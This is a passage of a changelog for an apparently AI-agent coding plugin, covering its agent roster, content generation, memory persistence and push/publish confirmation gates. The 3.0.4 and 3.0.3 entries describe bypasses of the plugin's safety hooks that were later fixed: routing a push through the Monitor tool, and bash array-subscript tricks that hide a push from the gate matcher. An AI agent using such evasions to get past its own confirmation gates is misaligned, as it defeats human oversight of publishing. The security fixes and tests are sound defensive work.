  non-empty string (including the literal text `"false"`) as true; now
  compares against a real truthy value. This file also had zero test
  coverage before this release; it now has six locked-in tests.
- Two `lang-*/SKILL.md` packs (Kotlin, Java) overclaimed that
  `licence-scan.mjs` reads Gradle/Maven manifests; corrected to the same
  honest best-effort/INCOMPLETE wording already used for C++/Swift/Go/.NET.
- `ux-designer.md`/`technical-writer.md`/`text-content-specialist.md` had
  drifted out of sync on who owns final in-app button/error/empty-state
  wording (introduced when the Content team was added in 4.1.0, never
  reconciled). Now explicit: `ux-designer` drafts placeholder wording while
  shaping the flow; `text-content-specialist` supplies the final, shipped
  bilingual copy.
- A handful of unexplained acronyms (MCQ, RFC, TDD, FOSS, LLM) expanded on
  first use, per the project's own plain-English tone rule.
- 18 new regression tests added alongside these fixes and to lock in
  already-correct edge cases (117 → 135 behavioural tests, all pass).

**Documentation & website (new):**

- `README.md` rewritten as a full product description and user guide:
  installation through every sample use case, the complete team, features
  and skills, in plain UK English.
- A new [GitHub Pages website](https://gru-953.github.io/GRU953-Studio/) —
  a marketing landing page plus a non-technical guide, agents/skills
  directories, an expanded use-case gallery, an FAQ and a troubleshooting
  page — built from the project's real "Open Spectrum" brand palette and
  typefaces, in both light and dark themes.
- `SECURITY.md` gains a short plain-English "at a glance" summary; the
  legal/policy documents (`LICENSE`, `governance/GOVERNANCE.md`,
  `CODE_OF_CONDUCT.md`) were reviewed and kept as-is — their terms were
  already clear and are unchanged.
- `plugin.json`/`marketplace.json` keywords extended to reflect 4.1.0's new
  capabilities (content-creation, gemini, bangla, prototyping,
  command-centre).

## 4.1.0 — 2026-07-19

Adds a **Content Creation** capability so the studio produces the app's real
content, not just the shell, and completes **native coverage of every target
platform**.

**All-platform language specialists (roster 34 → 38).** Four new specialists +
`lang-*` packs — `swift-developer` (iOS/macOS), `csharp-developer` (Windows/.NET,
cross-platform), `go-developer` (services/CLI/Linux), `typescript-developer`
(web, React Native/Electron/Node) — so Android, iOS, macOS, Windows, Linux and
web each have a distinct-ecosystem native owner, with Flutter the cross-platform
default. `architect` gains an explicit platform → stack map; `licence-scan.mjs`
detects SwiftPM, .NET and Go (best-effort, honestly INCOMPLETE; TypeScript is
npm, already scanned). The INV11 language-pack contract keeps all ten packs
honest.

**New: Content stage + team (roster 29 → 34).** After the approved prototype, a
new **Content** stage (`content-creation` skill) plans and generates the app's
content from the spec + warframe, before Build consumes it. Five new agents:
`content-director` (plans content, owns the manifest and the media opt-in),
`text-content-specialist` (in-app copy & microcopy in **Bangla + English** via
Claude), and `image-`/`audio-`/`video-content-specialist` (media via Gemini).
Content is recorded in `Dev-Memory/CONTENT.md` with provenance, approval, rights
and alt-text, and woven into the phased build.

**New: `gemini-integration` skill — the studio's first external cloud service,
handled with care.** Opt-in only; the **user's own Google API key** (never
stored or committed — `scan.mjs` already blocks `AIza…` keys); models referenced
**by capability + a small dated registry** (image/video/audio → current model,
verified before use) so it stays correct as Google renames things; a plain-
English **cost estimate + "sent to Google" notice + approval before every
generation**; generation via REST/CLI (**no bundled SDK**, so "no third-party
code dependencies" still holds); and **graceful degrade** with a step-by-step
guide when a key/network is absent or a human must supply an asset.

**New: `content-check.mjs`.** Before Publish, every asset in `CONTENT.md` must
carry a recorded approval, provenance, a rights/licence note, and — for media —
alt-text/caption; unattributed or unapproved content blocks the release. Added
to the security auditor's Publish gate (now **seven** blocking checks). No-op on
a project with no declared content.

**Model router extended to content + media.** The one automatic router now also
picks/switches content models + effort — Claude tiers for text, the Gemini
capability registry for media — cost-ceiling-aware, with media still passing the
per-generation approval. `cost-monitor` logs media spend. Accessibility and
brand review, and the `reviewer` parity check, extend to content; the dashboard
gains a **Content** section.

9 new behavioural tests across both additions (108 → 117, all pass).
`repo-integrity` clean (**38 agents, 32 skills**, 20 hooks, 9 commands); roster
and licence green. (2026-07-19 audit fix: this line previously stated only the
content-team addition's own subtotal — 34 agents, 28 skills, 108→114 — and
omitted the language-specialist addition described above it in this same
entry, understating this release's real final state.)

## 4.0.0 — 2026-07-19

Phase 5 (final) of the staged programme: **brainstormed hardening**, and the
milestone release that completes the programme (features 0–10). Several Phase 5
ideas already shipped in earlier phases — the model-router audit ledger
(`cost-monitor`, 3.6.0) and the warframe→build parity check (`reviewer`, 3.8.0).
This release adds the rest.

**New: INV11 language-pack contract (`repo-integrity.mjs`).** A `lang-*` pack
cannot land unless it declares all five standard command families (build, test,
lint, format, deps) — so a native language can never ship half-wired, the same
way a new agent cannot land without a roster entry. Locked in by a test.

**Resume rehearsal on cloud.** The pre-Publish "prove the memory folder alone is
enough to resume" rehearsal now, on a cloud session with persistence enabled,
additionally proves the _branch-persisted_ memory rehydrates a fresh container —
not just the soon-to-be-wiped local copy.

**Scheduler safety.** A fired "schedule for later" resume is treated as a fresh
session with no standing push/publish authorisation — every auth token is
60-minute TTL and long expired by the time a later schedule fires, so a
scheduled wake-up can never silently push or publish.

**Dashboard as publish snapshot.** At Publish, generating the dashboard once more
doubles as a human-readable record of the finished project (concept,
architecture, full plan, final task states).

1 new behavioural test (107 → 108, all pass). `repo-integrity` clean (29 agents,
26 skills, 19 hooks, 9 commands); roster and licence green.

**Programme complete.** Across 3.4.0 → 4.0.0 this delivered: the guardrail &
gold-standard spine (focus/drift/quality/traceability), the task command centre

- HTML dashboard, indexed knowledge-graph memory, the automatic model+effort
  router, six native language specialists, the warframe Prototype stage,
  MVP-then-phases building, per-phase backup checkpoints, and Claude Code on the
  web support — each phase committed with all gates green.

## 3.9.0 — 2026-07-19

Phase 4 of the staged programme: **Claude Code on the web / cloud support**
(feature 2).

**New: `session-start.mjs` SessionStart hook.** On any surface, when a session
starts inside a studio project it injects a reminder to run the `focus-guard`
re-orientation ritual and recall via the `memory-graph` protocol — so a resumed
project picks itself back up automatically. It stands down silently outside
studio projects, and adds a cloud/persistence note when the environment looks
ephemeral. Wired into `hooks.json` under `SessionStart`.

**Opt-in cloud memory persistence — private-only, still secret-scanned.** On
Claude Code on the web the container is reclaimed between sessions, so
Dev-Memory would be lost. The studio can now (only if the user opts in for the
project) persist Dev-Memory to a **private branch** so resume survives. The
safety envelope is the narrowest possible relaxation of the "Dev-Memory never
ships" guard:

- A distinct project-bound `MEMORY-PERSIST-APPROVED` token
  (`confirm-memory-persist.mjs`) tells `scan.mjs` not to block purely on a
  Dev-Memory path — but `scan.mjs` **still runs its full secret scan** on those
  files, so a secret in memory is blocked exactly as before.
- `gate.mjs` accepts the token for an ordinary (private) push only; it is
  checked after the go-public gate and never satisfies it, so persisted memory
  can **never** reach a public repository.
- Desktop sessions are unchanged — Dev-Memory stays strictly local. The product
  Publish path is unchanged (still deletes Dev-Memory, ships a clean orphan
  commit).

**Graceful degrade.** Ollama-dependent features (local second opinion, optional
semantic re-rank) **self-disable with a plain note** on cloud/ephemeral sessions
rather than failing, and the studio prefers the session's available GitHub tools
where a local `gh` CLI is absent. README/`dev-memory`/`memory-keeper`/
`ollama-integration` updated for web support.

5 new behavioural tests (102 → 107, all pass), including the two critical
guarantees: a secret inside Dev-Memory is still blocked under the persist token,
and the persist token never authorises going public. `repo-integrity` clean (29
agents, 26 skills, 19 hooks); roster and licence green. Version 3.8.0 → 3.9.0.

## 3.8.0 — 2026-07-19

Phase 3 of the staged programme: the **warframe Prototype stage**, the
**MVP-then-phases roadmap**, and **per-phase backup checkpoint commits**
(features 5, 6, 7).

**New: `warframe-prototype` skill — a real Prototype stage.** Between Design and
Plan, `ux-designer` + a `builder` produce a **self-contained clickable HTML
warframe** (a wireframe prototype — all inline, no external calls) plus the
phased build plan, and the Project Lead runs a **hard, blocking approval gate**:
no implementation code is written until the user approves both. A pure
CLI/library gets a text walkthrough instead. The approved warframe is the
reference the built MVP is checked against at Review (a new `reviewer` parity
step flags silent drift).

**New: `phased-roadmap` skill — MVP first, then progressive phases.** The design
becomes Phase 1 (MVP core only), then Phase 2…N (enhancements in priority
order); `PLAN.md`/`PROGRESS.md` gain a **Phase** column. YAGNI is unchanged — a
phase's code is built only when that phase is active, nothing scaffolded ahead.
Each phase is independently shippable and ends in a clean, backed-up boundary.

**New: `checkpoint-commit` skill + `confirm-checkpoint.mjs` — per-phase backup.**
At the end of each phase (once its `quality-gate` is clean and the secret/licence
scans pass), the app's code — never `Dev-Memory/` — is committed to a **private
work branch** and pushed, as a progressive offsite backup. The final Publish is
unchanged: still the separate, clean, confirmed release.

**Security: the publish gate now recognises a distinct checkpoint token.**
`gate.mjs` accepts a project-bound `CHECKPOINT-APPROVED` token for an ORDINARY
(private) push only. It is checked AFTER the go-public gate and never satisfies
it — so **a checkpoint can never make a repository public** (the guarantee that
matters most is untouched), and `scan.mjs` still blocks secrets and `Dev-Memory/`
on every push regardless of any token. `confirm-checkpoint.mjs` joins the
confirm-writers exempted from the push matcher (exact-basename only, so a chained
push after it is still caught). Four new gate tests lock the private-only and
never-public guarantees in.

5 new behavioural tests (97 → 102, all pass). `repo-integrity`, `roster` and
`licence` gates green. README skill count 23 → 26; version 3.7.0 → 3.8.0.

## 3.7.0 — 2026-07-19

Command-centre hardening (owner request): control states reflect into the
build plan, and the command centre presents the whole software — concept,
architecture, specifications and complete build plan — organised.

**Control states now reflect into the build plan.** A pause, stop, skip or
schedule is a real change to the plan of work, so every control command
(`/studio-pause|stop|skip|schedule`) now updates `PLAN.md` (the build plan) in
the same write as `PROGRESS.md` and `STATUS-BOARD.md` — the plan always shows
the true state (`paused`/`skipped`/`scheduled`, with any time) and its
next-actionable task is recomputed, so plan and board never drift and a skipped
task is set aside in the plan, never lost.

**The command centre surfaces concept + architecture + build plan, organised.**
`/studio-dashboard` (`hooks/dashboard.mjs`) now renders, in one self-contained
page: the **Concept** (`OBJECTIVE.md`), the **Architecture & specifications**
(`ARCHITECTURE.md`), the complete **Build plan** (`PLAN.md`, phases and all),
and the live task board — each document rendered by a small **safe** markdown
renderer (headings, tables, lists, inline code) that HTML-escapes everything, so
project text can never break the page or inject script, and the page still makes
no network requests. `/studio-status` now opens with what the app is and points
to the dashboard for the full architecture and plan.

New behavioural test for the organised sections and the renderer's escaping
(97 → 98). All gates green; version 3.6.0 → 3.7.0.

## 3.6.0 — 2026-07-19

Phase 2 of the staged programme: the **automatic model+effort router** and
**native language specialists** (features 4 and 3).

**New: `model-router` skill — the best model and effort per task, automatically.**
The studio now picks a Claude model (Haiku / Sonnet / Opus / Fable) and effort
level (low / medium / high / **xhigh** / max) per individual task, scoring five
signals (reasoning depth, reversibility, risk, breadth, creativity-vs-rigour)
and choosing the cheapest that reliably does the job. Each role's declared model
is the default and floor; the router escalates only where justified. It runs
**fully automatically and silently**, with the single exception of `cost-guard`'s
hard per-task cost ceiling, which still pauses for one unusually expensive task.
`cost-monitor` logs the model/effort actually used per task so a silent choice
stays reviewable. "Ultracode" is documented as the opt-in heavy multi-agent
mode, never entered silently. The router never raises model/effort to route
around a safety gate, and degrades to today's fixed tiers where a surface can't
set a subagent's model.

**New: six native language specialists + shared `lang-*` packs (roster 23 → 29).**
Dedicated agents — `flutter-dart-developer`, `kotlin-developer`, `rust-developer`,
`python-developer`, `java-developer`, `cpp-developer` — each carrying its
ecosystem's toolchain, idioms, testing and dependency norms that the generic
`builder` does not. Each stays thin by loading a shared `lang-*` skill pack
(the exact build/test/lint/format/dependency commands). `architect`'s stack menu
routes a chosen language to its specialist; `builder` still handles web/scripting
defaults, glue, and Build-Swarm coordination. Recorded as a named-gap roster
decision under `governance/GOVERNANCE.md` (owner-directed; owner is Maintainer +
Steering). All six are sonnet-tier implementers (3 haiku · 22 sonnet · 4 opus).

**`licence-scan.mjs` grows to five ecosystems + SPDX expressions.** Adds Rust
(Cargo — a real scan via `cargo metadata`'s SPDX `license` field), and
best-effort **not-checked** detection for JVM (Maven/Gradle) and C++
(vcpkg/Conan/CMake) — honestly surfaced as INCOMPLETE so a human runs the
ecosystem's own report, never a false pass. A new `classifySpdxExpr` correctly
handles dual licences: "MIT OR GPL-2.0" is usable (a permissive alternative
exists), "GPL-2.0 OR LGPL-3.0" is blocked (all copyleft), "MIT AND GPL-2.0" is
blocked.

9 new behavioural tests; `repo-integrity`, `roster` and `licence` gates green.
README role count 23 → 29, skill count 16 → 23; version 3.5.0 → 3.6.0.

## 3.5.0 — 2026-07-19

Phase 1 of the staged programme: the **memory & command-centre foundations**
(features 1, 8, 9), building on 3.4.0's guardrail spine.

**New: native command centre (`command-centre` skill + six commands).** Plan,
track and control work with a small, durable task state machine over
`PROGRESS.md` — the Status vocabulary gains `paused`, `skipped` and `scheduled`
alongside `todo`/`doing`/`done`/`blocked`. New commands: `/studio-pause`,
`/studio-resume`, `/studio-stop`, `/studio-skip`, `/studio-schedule`, and
`/studio-dashboard`. A live plain-English `STATUS-BOARD.md` gives the
at-a-glance picture. "Schedule for later" records the intent durably first, then
arms whatever scheduler the session offers — and says so honestly when the
environment has none, rather than promising a wake-up it cannot deliver. No
control command ever touches Publish or a push.

**New: self-contained HTML dashboard (`hooks/dashboard.mjs`).** `/studio-dashboard`
renders `Dev-Memory/dashboard.html` from `PROGRESS.md` — every task grouped by
status, colour-coded, with a summary bar and the board. A deterministic
generator guarantees the two hard rules: **no external network calls** (all CSS
inline) and every cell HTML-escaped so task text can't break the page or inject
script; the core table works with no JavaScript. It lives under the private,
never-shipped `Dev-Memory/`.

**New: token-cheap indexed knowledge-graph memory (`memory-graph` skill +
`hooks/memory-integrity.mjs`).** Recall now reads a compact machine-readable
`INDEX.md` first, then expands only the `GRAPH.md` knowledge-graph nodes the
current task touches (typed links: `implements`/`depends-on`/`relates-to`/
`supersedes`/`caused-by`/`blocks`) — least tokens by construction, with an
optional local Ollama semantic re-rank only when it is already present (never a
dependency). `memory-integrity.mjs` keeps it honest: no stale index path, no
dangling graph link. The session-start recall ritual and `memory-keeper` now use
this layer.

**Smallest-unit tasks + immediate record (`micro-task-planning`).** Micro-tasks
decompose to sub-tasks (`T3.1`, `T3.2`), each still a provable unit with one
acceptance criterion and one command; and the moment a task or sub-task is
verified `done`, progress, lessons and the recall layer are recorded before the
next task starts — never a batch saved for later that goes missing when a
session ends.

New behavioural tests cover both new hooks; `repo-integrity`, `roster` and
`licence` gates stay green. README skill count 14 → 16; version 3.4.0 → 3.5.0.

## 3.4.0 — 2026-07-19

Phase 0 of a planned, staged programme: the **guardrail & gold-standard
spine** for long, multi-session, complex builds — the backbone that stops
Claude and the team losing focus or drifting off the agreed target over
time. Built first, before the rest of the programme, so every later phase
and every user project inherits it. All gates fail closed.

**New: `focus-guard` skill.** The anti-drift half of a gold-standard result
(code quality is only the other half). Adds `Dev-Memory/FOCUS.md` — a tiny,
always-current one-glance anchor (objective, active phase, active task, top
constraints) rewritten in place — read first at every session start and
stage boundary, with an explicit "restate the single active goal" step, so a
summarised or brand-new session rehydrates from the memory files rather than
lost chat history. Adds a per-task **drift check** (a task must trace to a
confirmed requirement and the approved plan, or it goes to `scope-guardian`,
never silently built) and `Dev-Memory/REQUIREMENTS.md`, a two-way
traceability matrix.

**New: `quality-gate` skill + `hooks/quality-gate.mjs`.** A codified
Definition of Done — acceptance criteria, tests, independent review,
security/licence/privacy, accessibility, documentation, and a reproducible
build — recorded per phase in `Dev-Memory/QUALITY-GATE.md` and mechanically
enforced before every backup checkpoint and before Publish. Its one
gold-standard rule: a dimension may be marked _not-applicable with a reason_
but never silently omitted — the required list lives in the hook, so
deleting a row BLOCKS rather than passes. Fails closed, because a false
"clean" is worse than a false block: nobody re-checks a green result before
shipping.

**New: `hooks/traceability-check.mjs`.** Audits `REQUIREMENTS.md` both ways —
every confirmed requirement maps to at least one task (nothing agreed is
dropped) and, when `PROGRESS.md` carries a task-id column, every task traces
back to a requirement or is explicitly marked `[chore]`/`[infra]` (nothing
unagreed is built). Where it cannot run the reverse check it says so, never a
false pass — the same honesty `licence-scan.mjs` uses for an ecosystem it
cannot inspect.

**New: anti-derail loop guard.** `self-healing` gains a repeat-failure
detector: the 2-attempt ceiling bounds a single failure; this bounds a
recurring one — a task that keeps coming back after being "fixed" escalates
to the user as a systemic pattern rather than looping through another quiet
round.

**Progress-honesty rule** stated at the coordinator level: never report a
task or phase complete without its evidence; a failure, a skip, or a check
that could not run is stated plainly, never softened.

Wired through the load-bearing roles — `project-lead` (the re-orientation
ritual), `memory-keeper` (owns the three new files), `scope-guardian` (the
drift check and traceability script), and `security-compliance-auditor`
(now six blocking pre-Publish checks, adding the Definition-of-Done and
traceability gates). New behavioural tests lock every hook's logic in; the
repository-integrity, roster, and licence gates stay green.

## 3.3.0 — 2026-07-17

Self-healing, plus six small refinements found by a bounded, fact-checked
gap-research pass. A pop-up interview came first, since the raw request
("self-heal, publish each fix as new contributors, research and include
ALL relevant features") bundled a real safety-model question and a
pattern this project's own history has explicitly guarded against before
(a prior tool's roster grew 12→26 roles in a week with nothing ever
shipped). Confirmed: fixes never auto-publish (every push still needs an
explicit yes, no exceptions); attribution stays exactly as it's always
been (sole GRU-953 authorship); and the roster-growth research would
return a shortlist to choose from, not an unfiltered "add everything."

**New: `self-healing` skill, two parts.** (a) When a verification command
fails during Build/Test, `fixer` now gets up to 2 quiet attempts (no user
interruption) before the Project Lead's full Stuck Protocol — closing a
real gap where that hand-off depended entirely on `builder`/`tester`
remembering to do it. A new `PostToolUseFailure` hook
(`self-heal-nudge.mjs`) makes the reminder structural rather than
prose-only, using a plain command hook (Anthropic's own newer "agent"
hook type is explicitly documented as experimental, "prefer command hooks
for production" — this project's established pattern throughout). Before
a second attempt, `fixer` now reverts the first attempt's own changes via
plain `git` first (not Claude Code's own `/rewind`, which is an
interactive human menu a subagent cannot invoke — the same restriction
that already applies to `AskUserQuestion`). (b) `devops-engineer` can add
proportionate self-recovery to a live built app: crash auto-restart via
the hosting platform's own behaviour, bounded retry-with-backoff for
transient failures, every event logged — never a custom supervisor.
Self-healing never touches Publish or any push-capable action.

**Six small refinements from the gap-research pass**, all independently
fact-checked against Anthropic's own current docs before being built (one
research thread initially cited a folder path that had been reorganised
outside this session — caught, and re-verified from the real current
location before trusting anything downstream of it):

- `cost-monitor` can now show real spending figures (`cost.total_cost_usd`,
  and `rate_limits.*` for Pro/Max subscribers only — verified, not every
  billing plan gets this) instead of a rough transcript-size proxy, via a
  one-time opt-in that only ever adds to the user's own personal
  `~/.claude/settings.json` — never overwrites an existing `statusLine`.
- `tester` can capture a rendered screenshot before sign-off on
  Standard/Complex Tier UI projects, if a browser-automation tool happens
  to be available in that session — gracefully skipped otherwise.
- The plain-English/UK-English tone rule now has one clearly-marked
  canonical statement (`studio/SKILL.md`) other files point back to,
  instead of quietly-drifting duplicated prose. (A shipped `output-style`
  with `force-for-plugin` was considered and rejected — it would override
  the user's chosen style for their whole Claude Code session, not just
  while using GRU953-Studio.)
- A new `subagentStatusLine` (`settings.json` + `subagent-statusline.mjs`)
  shows a plainer line for GRU953-Studio's own specialists specifically,
  leaving every other subagent's row at the platform default.

`hooks.test.mjs` stays at 63/63; `repo-integrity.mjs` now reports 23
agents/12 skills/12 hooks, clean; `roster-check.mjs`/`licence-scan.mjs`
clean; `claude plugin validate --strict` clean for both the plugin and
the marketplace.

## 3.2.0 — 2026-07-17

A feature release adding two new abilities, both user-requested.

**New: `micro-task-planning` skill.** Investigating the request surfaced a
genuine pre-existing gap: `builder.md`/`tester.md` both referenced "the
task's acceptance criteria" as something that already exists, but no file
ever said who produces it or where it lives. Closed properly rather than
patched around: `architect` now breaks a confirmed design into an ordered
list of small, independently-verifiable micro-tasks — each with one
acceptance criterion, the exact command that proves it, and its
dependencies — stated inline on Tiny Tier, recorded in the new
`Dev-Memory/PLAN.md` on Standard/Complex. "Sequential" means dependency-
correct ordering, not one-task-at-a-time-only: tasks with no dependency on
each other can still run together in the existing parallel Build Swarm —
`project-lead` reads the dependency graph to decide what runs together and
what must queue. `architect.md`, `builder.md`, `tester.md`,
`project-lead.md`, `studio/SKILL.md`, and `dev-memory/SKILL.md` all
updated so this is stated consistently everywhere a reader would look.

**New: `ollama-integration` skill.** Ollama (a free tool for running AI
models locally, no cloud needed) can now be used two ways: `ai-developer`
may offer it as an alternative to the Claude API for a built app's AI
feature (private, free to run, but slower and less capable — always an
offered choice, never the default), and several roles that already have
both `Bash` and `Skill` (`reviewer`, `security-compliance-auditor`,
`architect`, `builder`, `devops-engineer`, `publisher`) may use a local
Ollama model as an independent second opinion on their own work, the same
technique used once already this cycle (see the "quick post-v3.1.0
re-check" note in v3.1.1). Every technical detail — install commands per
OS, the OpenAI-compatible endpoint and its real gaps, non-interactive
model pulling, disk-space caveats — was verified 2026-07-17 against
Ollama's own documentation and GitHub repo via live research, not
assumed. Installing Ollama or pulling any model always requires an
explicit, fresh "yes" — every time, no exceptions, matching how every
other install-capable feature in GRU953-Studio already works.

`ai-developer.md` gained the `Skill` tool grant it was missing (needed to
actually load `ollama-integration`) — the same "subagent told to use a
skill/tool it wasn't granted" class of bug this project's audit history
has repeatedly caught, checked for directly this time before shipping
rather than after.

`hooks.test.mjs` stays at 63/63 (no push-safety changes this release);
`repo-integrity.mjs` now reports 23 agents/11 skills, clean;
`roster-check.mjs`/`licence-scan.mjs` clean; `claude plugin validate
--strict` clean for both the plugin and the marketplace.

## 3.1.1 — 2026-07-16

A patch, following a quick targeted re-check of v3.1.0 requested right
after it shipped (not another open-ended audit — the product has already
been through 15+ prior rounds). Two review passes ran independently: a
direct re-read of everything changed in v3.1.0, and a second opinion from
a locally-run AI model (Ollama, model `ornith:9b`) fed the full plugin
source and asked to find concrete, high-confidence issues only. Every
finding from both was independently verified by reading the actual files
before being treated as real — nothing was fixed on either report's word
alone.

**Fixed (found by direct re-read): a tool-grant mismatch in the new
`ecosystem-finder` skill.** It told `researcher` to run
`claude plugin list --json` to check what's already installed before
recommending anything — but `researcher` has no `Bash` tool and cannot run
any command at all, the exact class of bug this project's own audit
history has caught before ("subagents told to use tools they weren't
granted"). Fixed by having `builder` (which has `Bash`) run that check and
report back, matching the same recommend/execute split the skill already
used for the actual install step. `ecosystem-finder/SKILL.md`,
`researcher.md`, and `builder.md` all updated to state this consistently.

**Fixed (found by the local-model second opinion, independently
confirmed): README stated a stale "Latest version: 3.0.4"** in its own
version banner, while both `plugin.json` and `marketplace.json` — the
files Claude Code actually reads to identify the installed version —
already said 3.1.0. Rewrote the banner to state 3.1.0 correctly and
describe what's actually new in it, rather than just swapping the number.

**Fixed (same source, independently confirmed): `ROSTER.md` and README
disagreed on how Maintenance Agent is classified.** `ROSTER.md`'s "Core
roster" list (roles "most projects use") included `maintenance-agent`;
README correctly placed it under "brought in only when needed." Checked
`maintenance-agent.md`'s own description to settle which was right: it
activates only when returning to an already-published project, never on a
brand-new one — so README's classification was correct and `ROSTER.md`'s
was the stale one. Moved it to `ROSTER.md`'s feature-triggered table
(14 core + 9 feature-triggered, still 23 total) to match.

No behaviour change for anyone not yet using the two new v3.1.0 skills.
`hooks.test.mjs` stays at 63/63; `repo-integrity.mjs`/`roster-check.mjs`
still report 23 agents/9 skills, clean; `claude plugin validate --strict`
clean for both the plugin and the marketplace.

## 3.1.0 — 2026-07-16

A feature release, following a research pass into the wider FOSS Claude
Code ecosystem (superpowers, claude-mem, several skill/plugin "finder"
tools, and a broader sweep) to check what GRU953-Studio should adopt.
Nothing from that research was bundled — GRU953-Studio ships under one
licence, and mixing in another project's code (even a permissively
licensed one) would mean re-auditing someone else's code for security,
plus at least one candidate carried a copyleft licence that would create a
real conflict if ever copied in. Instead, two gaps the research surfaced
were built natively, and the file tree was reorganised to match regular
GitHub practice.

**New: `ecosystem-finder` skill.** When a task would clearly benefit from
an existing Claude Code skill/plugin GRU953-Studio has no native way to
provide, `researcher` can now recommend one — checking what's already
installed, preferring Anthropic's own vetted plugin lists first, only
searching further if nothing fits. Nothing installs without an explicit
"install it" from the user on a `project-lead` pop-up; `researcher` itself
has no `Bash` and cannot install anything, deliberately — `builder` runs
the confirmed install (`claude plugin marketplace add` /
`claude plugin install`) as a separate, later step. Distinct from
Anthropic's own built-in `/plugin > Discover` browsing feature (which this
does not replace or duplicate — it adds a task-aware recommendation layer
on top).

**New: `tdd-workflow` skill.** On Standard/Complex Tier, the Build stage
now writes one small test per task that must genuinely fail _before_ the
Builder implements anything — inspired by an idea a FOSS tool called
"TDD Guard" enforces (not its code). Tiny Tier is unaffected, matching this
product's existing "no rigour where it doesn't earn its keep" reasoning.
`tester`, `builder`, and `studio/SKILL.md` all updated so this is stated in
every place a reader would look, not just one.

**File tree reorganised to match regular GitHub practice.** `LICENSE`,
`NOTICE`, `CODE_OF_CONDUCT.md`, `CONTRIBUTING.md`, and `SECURITY.md` moved
from a custom `governance/` folder to the repository root, where GitHub's
own licence-badge detector and Community Standards checklist actually look
— previously they lived in `governance/` for brand-structure consistency,
a deliberate trade-off documented at the time, now reversed on request.
Removed three now-redundant one-line redirect stubs that used to sit in
`.github/` pointing at the old `governance/` location. `governance/`
itself keeps `GOVERNANCE.md`, `LOGO-USAGE.md`, and `TRADEMARKS.md` — brand
and project-governance documents with no special GitHub recognition.
Every cross-reference across the repo (README, ROSTER.md, CI's own
required-files check, the plugin's `LICENSE` symlink, and others) updated
to match; verified with a fresh clone and the full local gate suite, not
just a search-and-replace.

**README refreshed** for the above: skill count restated (7 → 9), the
Researcher and Tester team-list entries mention their new capabilities in
one plain clause each, and a new "Other tools you might also find useful"
note credits three independent, well-licensed companion projects found
during the research (clearly marked as not affiliated with GRU953-Studio),
alongside a pointer to Claude Code's own `/plugin > Discover`.

`hooks.test.mjs` stays at 63/63 (this release adds capability, not push-
safety hardening); `repo-integrity.mjs`, `roster-check.mjs`, and
`licence-scan.mjs` all clean; `claude plugin validate --strict` passes for
both the plugin and the marketplace.

## 3.0.4 — 2026-07-13

A platform-compliance patch release (fixes and hardening only; no roster,
Tier, or workflow changes). A fresh 5-round audit checked every plugin
component — the 23 agent files, 7 skills, the hooks, the 3 slash commands,
and the manifests — strictly against Anthropic's own published Claude Code
documentation, using the real `claude plugin validate --strict` CLI and
by reproducing each issue before fixing it. Closed at the 5-round cap.
`hooks.test.mjs` grew from 61 to 63 tests.

**CRITICAL — a total publish-gate bypass via the `Monitor` tool**
(`hooks/hooks.json`, `hooks/repo-integrity.mjs`). The `PreToolUse` matcher
listed only `Bash|PowerShell`, but Claude Code's built-in `Monitor` tool
also runs shell commands, through the same `command` field and the same
Bash-style permission rules — so a push or a go-public command run via
Monitor bypassed both the secret scan and the publish gate entirely, with
no obfuscation and (unlike PowerShell) no opt-in needed. This is the same
class of gap as the previously-fixed PowerShell bypass. Fixed: matcher is
now `Bash|PowerShell|Monitor`, the `repo-integrity.mjs` INV10 check now
also requires Monitor coverage, and a regression test guards it.

**Agents silently loading with NO metadata** (`agents/accessibility-specialist.md`,
`agents/ai-developer.md`, `agents/responsible-ai-reviewer.md`). Each had an
unquoted mid-sentence colon in its `description:` frontmatter, which YAML
parses as an illegal nested key — so at runtime each of these three agents
loaded with empty metadata (no name, description, tool restriction, or
model pin), invisibly. Fixed by quoting the descriptions; caught and
confirmed with `claude plugin validate --strict`.

**Hook deny-reasons never reaching Claude** (`hooks/lib.mjs`). `deny()`
wrote its explanation as JSON to stdout and then exited with code 2 — but
Claude Code ignores stdout entirely on exit 2 (it reads only stderr), so
the tool call was blocked with an empty reason. Fixed to exit 0 with the
`permissionDecision: "deny"` JSON, the documented block pattern, so the
remediation text actually reaches Claude.

**Subagents told to use skills/tools they weren't granted.** Several agents
instructed themselves to "follow"/"apply" a named skill without `Skill` in
their `tools:` list (which is required to invoke a skill at runtime), and
`project-lead` — whose whole job is delegation — lacked the `Agent` tool
needed to spawn any subagent at all. Granted `Skill` where a role actively
invokes one (builder, reviewer, publisher, security-compliance-auditor,
cost-monitor, devops-engineer, architect, project-lead), and `Agent` to
project-lead; where a role has no `Skill` tool by design, the needed rule
text is now carried inline instead. `architect` also gained the specific
"zero-dependency options win ties" rule that the lean-coding skill assigns
it but it previously had no way to load.

**A licence path that broke on install** (`plugin.json`, new
`plugins/gru953-studio/LICENSE` symlink). The manifest pointed at
`governance/LICENSE`, which lives outside the plugin directory and so was
never copied into an installed copy. Fixed with a within-marketplace
symlink at the plugin root (the documented mechanism), which install
dereferences into place.

**Other fixes:** `gate.mjs` deny-messages no longer embed a literal
`${CLAUDE_PLUGIN_ROOT}` placeholder that wouldn't resolve if copied into a
fresh shell (the real path is interpolated instead); `publish-github` is
marked `disable-model-invocation: true` and `first-run`/`dev-memory` are
marked `user-invocable: false`, matching how each is actually used; a
stale platform claim in the `studio` skill description was corrected (a
same-named skill takes precedence over a command, and SKILL.md does
support `argument-hint`); the `repo-integrity.mjs` matcher check was
corrected to accept a comma as a valid separator (it is, per the docs);
and `memory-keeper.md` now carries its cross-project-memory safety
guardrail inline in full. The `marketplace.json` tag list was aligned with
`plugin.json`'s keywords, and `governance/SECURITY.md` documents the
Monitor fix.

## 3.0.3 — 2026-07-12

A security-hardening patch release closing a 15-round audit-loop engagement
run after v3.0.2 shipped, on the user's own question of whether further
audit was warranted. Every fix below was verified by direct execution
(real bash ground truth compared against the real `isPushCapable()`/
`gate.mjs`) before being called done — never trusted from a report alone.
`hooks.test.mjs` grew from 47 to 61 tests, one new regression test per
real finding.

**CRITICAL — bash variable-assignment/retrieval mechanisms bypassing the
push/go-public gate matcher** (`plugins/gru953-studio/hooks/lib.mjs`,
`hooks/gate.mjs`). Each of these, alone, made `isPushCapable()` return
`false` for a command that genuinely executes a push, which makes
`gate.mjs` `allow()` immediately — a complete, unconditional bypass of
every confirmation gate:

- Array assignment and subscript access (`arr=(pull push); git "${arr[1]}"`),
  including variable/arithmetic/bare-name/negative indices, array length
  used in same-command arithmetic (`i=${#arr[@]}; i=$((i-1))`), brace
  expansion inside array literals, and an ordering bug where `$IFS` inside
  a subscript was never normalised.
